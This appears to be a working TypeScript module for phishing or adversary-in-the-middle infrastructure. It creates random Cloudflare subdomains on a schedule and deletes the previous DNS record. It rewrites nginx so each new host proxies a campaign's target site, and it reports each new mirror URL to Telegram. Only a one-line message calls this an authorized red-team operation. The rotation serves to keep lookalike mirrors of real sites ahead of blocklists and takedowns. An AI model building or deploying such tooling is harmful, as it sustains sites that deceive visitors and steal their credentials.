/**
 * Cloudflare subdomain rotation — creates new mirror hostnames and updates nginx.
 */
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { fetch } from 'undici'

import { updateCampaignMirrorFields, type CampaignMirrorRecord } from './campaign-store.js'
import { writeNginxConfig } from './nginx-template.js'
import { sendMirrorTelegram } from './telegram-notify.js'

const execFileAsync = promisify(execFile)

export type DomainRotationResult =
  | { ok: true; subdomain: string; mirrorUrl: string; dnsRecordId: string }
  | { ok: false; detail: string }

function readEnv(key: string): string | null {
  const v = process.env[key]?.trim()
  return v ? v : null
}

function randomSubdomainLabel(prefix: string): string {
  const slug = prefix.replace(/[^a-z0-9-]/gi, '-').toLowerCase().slice(0, 12)
  const rand = Math.random().toString(36).slice(2, 8)
  return `${slug || 'mirror'}-${rand}`
}

async function cloudflareRequest(
  method: string,
  path: string,
  body?: Record<string, unknown>,
): Promise<{ ok: true; json: Record<string, unknown> } | { ok: false; detail: string }> {
  const token = readEnv('CLOUDFLARE_API_TOKEN')
  const zoneId = readEnv('CLOUDFLARE_ZONE_ID')
  if (!token || !zoneId) {
    return { ok: false, detail: 'CLOUDFLARE_API_TOKEN or CLOUDFLARE_ZONE_ID not configured' }
  }

  const url = `https://api.cloudflare.com/client/v4/zones/${zoneId}${path}`
  const res = await fetch(url, {
    method,
    headers: {
      Authorization: `Bearer ${token}`,
      'Content-Type': 'application/json',
    },
    body: body ? JSON.stringify(body) : undefined,
  })
  const json = (await res.json()) as Record<string, unknown>
  if (!res.ok || json.success === false) {
    const errors = Array.isArray(json.errors) ? JSON.stringify(json.errors) : res.statusText
    return { ok: false, detail: `Cloudflare API error: ${errors}` }
  }
  return { ok: true, json }
}

async function deleteCloudflareRecord(recordId: string): Promise<void> {
  if (!recordId.trim()) return
  await cloudflareRequest('DELETE', `/dns_records/${recordId}`)
}

async function createCloudflareARecord(
  subdomain: string,
  ip: string,
): Promise<{ ok: true; recordId: string; fqdn: string } | { ok: false; detail: string }> {
  const baseDomain = readEnv('CLOUDFLARE_BASE_DOMAIN')
  if (!baseDomain) return { ok: false, detail: 'CLOUDFLARE_BASE_DOMAIN not configured' }

  const name = subdomain.includes('.') ? subdomain : `${subdomain}.${baseDomain}`
  const result = await cloudflareRequest('POST', '/dns_records', {
    type: 'A',
    name,
    content: ip,
    ttl: 120,
    proxied: true,
  })
  if (result.ok === false) return { ok: false, detail: result.detail }

  const resultObj = result.json.result as Record<string, unknown> | undefined
  const recordId = resultObj?.id != null ? String(resultObj.id) : ''
  if (!recordId) return { ok: false, detail: 'Cloudflare create returned no record id' }
  return { ok: true, recordId, fqdn: name }
}

async function reloadNginx(): Promise<void> {
  const cmd = readEnv('MIRROR_NGINX_RELOAD_CMD') ?? 'nginx -s reload'
  const parts = cmd.split(/\s+/)
  const bin = parts[0] ?? 'nginx'
  const args = parts.slice(1)
  try {
    await execFileAsync(bin, args)
  } catch (e) {
    console.warn(
      `[domain-rotator] nginx reload failed (non-fatal): ${e instanceof Error ? e.message : String(e)}`,
    )
  }
}

export async function rotateMirrorDomain(
  campaign: CampaignMirrorRecord,
  reason = 'scheduled',
): Promise<DomainRotationResult> {
  const vpsIp = readEnv('MIRROR_VPS_IP')
  if (!vpsIp) return { ok: false, detail: 'MIRROR_VPS_IP not configured' }

  const baseDomain = readEnv('CLOUDFLARE_BASE_DOMAIN')
  if (!baseDomain) return { ok: false, detail: 'CLOUDFLARE_BASE_DOMAIN not configured' }

  const prefix =
    readEnv('MIRROR_SUBDOMAIN_PREFIX') ??
    campaign.name.replace(/[^a-z0-9]/gi, '-').toLowerCase().slice(0, 16)
  const subdomainLabel = randomSubdomainLabel(prefix)
  const fqdn = `${subdomainLabel}.${baseDomain}`
  const mirrorUrl = `https://${fqdn}/`

  const oldRecordId = readEnv('MIRROR_LAST_DNS_RECORD_ID') ?? ''
  if (oldRecordId) await deleteCloudflareRecord(oldRecordId)

  const created = await createCloudflareARecord(subdomainLabel, vpsIp)
  if (created.ok === false) return { ok: false, detail: created.detail }

  process.env['MIRROR_LAST_DNS_RECORD_ID'] = created.recordId

  const confPath = readEnv('MIRROR_NGINX_CONF_PATH') ?? '/etc/nginx/nginx.conf'
  const sslCert = readEnv('MIRROR_SSL_CERT_PATH') ?? '/etc/nginx/ssl/active.crt'
  const sslKey = readEnv('MIRROR_SSL_KEY_PATH') ?? '/etc/nginx/ssl/active.key'
  const targetHost = campaign.target_domain.replace(/^https?:\/\//, '').split('/')[0] ?? campaign.target_domain
  const targetOrigin = campaign.target_domain.startsWith('http')
    ? campaign.target_domain
    : `https://${campaign.target_domain}`

  await writeNginxConfig(confPath, {
    targetOrigin,
    targetHost,
    serverName: fqdn,
    sslCertPath: sslCert,
    sslKeyPath: sslKey,
    listenPort: Number.parseInt(readEnv('MIRROR_HTTPS_PORT') ?? '443', 10),
  })
  await reloadNginx()

  await updateCampaignMirrorFields(campaign.id, {
    mirror_url: mirrorUrl,
    mirror_subdomain: fqdn,
    last_health_check_at: new Date(),
  })

  const msg = [
    '🔄 Mirror domain rotated (authorized red-team)',
    `Campaign: ${campaign.name}`,
    `Reason: ${reason}`,
    `New URL: ${mirrorUrl}`,
    `Target: ${campaign.target_domain}`,
  ].join('\n')
  await sendMirrorTelegram(msg)

  console.info(`[domain-rotator] rotated campaign=${campaign.id} url=${mirrorUrl} reason=${reason}`)
  return { ok: true, subdomain: fqdn, mirrorUrl, dnsRecordId: created.recordId }
}

export async function rotateCampaignById(
  campaignId: string,
  reason = 'manual',
): Promise<DomainRotationResult> {
  const { getCampaignById } = await import('./campaign-store.js')
  const campaign = await getCampaignById(campaignId)
  if (!campaign) return { ok: false, detail: 'Campaign not found' }
  if (!campaign.active) return { ok: false, detail: 'Campaign is not active' }
  return rotateMirrorDomain(campaign, reason)
}

export function readRotationIntervalHours(): number {
  const raw = process.env['MIRROR_ROTATION_INTERVAL_HOURS']?.trim()
  const n = raw ? Number.parseInt(raw, 10) : 12
  return Number.isFinite(n) && n > 0 ? n : 12
}
